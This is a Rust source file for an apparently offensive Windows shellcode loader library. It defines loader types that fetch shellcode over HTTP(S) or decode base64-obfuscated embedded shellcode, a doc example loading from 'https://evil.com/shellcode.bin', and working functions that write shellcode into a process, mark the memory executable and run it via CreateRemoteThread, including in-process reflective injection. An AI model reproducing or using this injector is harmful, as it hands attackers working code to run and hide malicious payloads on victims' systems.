// ================
// Standard Library
// ================
use std::error::Error;
use std::fmt;
use std::ptr;
use core::ffi::c_void;
// =====================
// External Dependencies
// =====================
use windows::{
    Win32::{
        Foundation::{
            CloseHandle,
            GetLastError,
            HANDLE,
            WIN32_ERROR
        },
        System::{
            Memory::{
                VirtualAllocEx, 
                VirtualProtectEx,
                MEM_COMMIT,
                MEM_RESERVE,
                PAGE_PROTECTION_FLAGS,
                PAGE_READWRITE,
                PAGE_EXECUTE_READ,
            },
            Threading::{
                INFINITE,
                OpenProcess,
                CreateRemoteThread,
                GetCurrentProcessId,
                GetProcessId,
                GetCurrentProcess,
                PROCESS_ALL_ACCESS,
                WaitForSingleObject
            }
        },
    },
    Win32::System::Diagnostics::Debug::WriteProcessMemory,
};

// ================
// Internal Modules
// ================
pub mod embedded;


///
/// The possible types of shellcode loaders. They are:
/// 
/// * `Url`: Raw Shellcode over HTTP(S)
/// * `Base64Url`: B64-encoded (n-iterations) over HTTP(S)
/// * `Embedded`: You give the loader a raw [Vec<u8>] 
///    of shellcode to inject
/// * `Base64Embedded`: Instead of a raw [Vec], you use b64
///    (n-iterations) to create an obfuscated shellcode string,
///    which will be decoded at runtime
/// 
pub enum InjectorType {
    Url(String),
    Base64Url(String),
    Embedded(Vec<u8>),
    Base64Embedded(String)
}

///
/// The `Injector` Trait comprises two functions: `inject()`, 
/// which performs the specified injection, and `load()`, 
/// which configures the Injector to load the shellcode from
/// a given source.
/// 
/// `Injector`s follow a builder pattern, meaning their 
/// implementation might be something like:
/// 
/// ```
/// let url_injector = UrlInjector::new()
///     .load(Url('https://evil.com/shellcode.bin')?;
///     
/// url_injector.inject();
/// ```
/// 
/// This allows for more injector types with additional 
/// options to easily be built in the future.
/// 
pub trait Injector {
    fn inject(&self);

    fn load(&self, sc_source: InjectorType) -> Self;
        
}
#[derive(Debug)]
pub struct InjectorError(String);

impl Error for InjectorError {}

impl fmt::Display for InjectorError {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

///
/// The generic function to write memory to either
/// our own our another process, depending on the handle.
/// 
pub unsafe fn write_mem(sc: &Vec<u8>, proc_h: HANDLE, base_addr: *mut c_void, wait: bool) {

    let sc_len = sc.len();
    let mut n = 0;
    WriteProcessMemory(proc_h, base_addr, sc.as_ptr() as  _, sc_len, Some(&mut n));

    let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
    VirtualProtectEx(
        proc_h,
        base_addr,
        sc_len,
        PAGE_EXECUTE_READ,
        &mut old_protect
    );

    
    let h_thread = CreateRemoteThread(
        proc_h, 
        None, 
        0, 
        Some(std::mem::transmute(base_addr)), 
        None,
        0, 
        None
    )
    .unwrap();
    
    
    CloseHandle(proc_h);

    if wait {
        if WaitForSingleObject(h_thread, INFINITE) == WIN32_ERROR(0) {
            println!("Good!");
            println!("Injection completed!");
            return;
        } else {
            let error = GetLastError();
            println!("{:?}", error);
            return;
        }
    }

}

///
/// Performs reflective injection.
///  
pub unsafe fn reflective_inject(sc: &Vec<u8>, wait: bool) {
    let h: HANDLE = GetCurrentProcess();
    let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
    write_mem(sc, h, addr, wait)
       
}